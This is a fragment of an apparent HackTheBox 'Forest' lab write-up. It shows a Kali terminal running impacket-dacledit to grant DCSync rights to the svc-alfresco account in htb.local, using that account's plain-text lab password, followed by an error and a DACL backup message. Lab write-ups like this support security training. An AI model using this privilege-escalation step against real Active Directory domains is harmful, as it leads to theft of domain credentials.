...
![Untitled 25 1](images/Untitled 25 1.jpg)
...
```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/forest]
└─# impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'EXCHANGE WINDOWS PERMISSIONS' 'htb.local'/'svc-alfresco':'s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Target principal not found in LDAP (EXCHANGE WINDOWS PERMISSIONS)
...
[*] DACL backed up to dacledit-20250930-032658.bak
